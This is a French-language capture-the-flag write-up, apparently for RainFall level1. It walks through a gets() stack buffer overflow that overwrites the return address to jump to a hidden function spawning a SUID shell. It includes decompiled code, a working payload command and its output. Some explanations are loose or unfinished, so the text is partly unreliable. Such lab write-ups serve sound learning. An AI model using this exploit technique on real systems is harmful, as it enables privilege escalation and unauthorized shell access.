# Explication

Si on lance le binaire on va avoir un prompt qui attend notre input, lorsque l'on ecrit dedans le programme se ferme.

En ouvrant le binaire avec `Ghidra` on lit la fonction main qui est toute simple :

```c
void main(void)

{
  char local_50 [76];

  gets(local_50);
  return;
}
```

La fonction `gets` est facile a exploiter car elle ne verifie pas la taille de l'input, la fonction stockant l'input dans une string de `76 Bytes` on peut donc facilement faire un buffer overflow.

Avec `Ghidra` on remarque egalement une autre fonction :

```c
void run(void)

{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}
```

Parfait c'est donc cette fonction que l'on devrait appeler pour avoir acces au shell avec les droits qu'il nous faut (`level1` se lancant avec SUID de `level2`). Le seul probleme est que cette fonction `run` n'est pas appelee par le `main`.

## Comment appeler `run` dans `main` ?

Quand une fonction est appele `l'EIP` va contenir l'addresse de la fonction dans laquelle la fonction qui est executee doit retourner. (Exemple -> `main` appel `gets` et `gets` retourne dans le `main`). Ici `l'EIP` se trouve derriere le buffer ou est stocke notre input dans la stack. Il nous est donc possible en faisant un buffer overflow de `76 Bytes` + `4 Bytes` avec les `4 Bytes` etant le registre `EIP` de re-ecrire l'addresse de la fonction dans laquelle doit retourner `gets` en y mettant l'addresse de `run`.

L'addresse de `run` est : `08048444`

Il faut ensuite passer cette addresse sous un autre format : `\x44\x84\x04\x08` !!A DETAILLER !! mais en gros on prend l'addresse et on la met a l'envers en rajoutant des `x`.

Si je passe un payload comme celui ci :

```sh
level1@RainFall:~$ python -c "print('1'*76 + '\x44\x84\x04\x08')" | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

On voit bien que la fonction `run` a bien ete appelee mais on a pas eu le temps de rentrer d'input dans le `system("/bin/sh");` , c'est normal car il n'y a pas d'entree ouverte apres que on est envoye notre payload. Pour contourner cela il nous faut garder une entree ouverte comme ceci :

```sh
{ cat /tmp/payload; cat; } | ./level1 
```
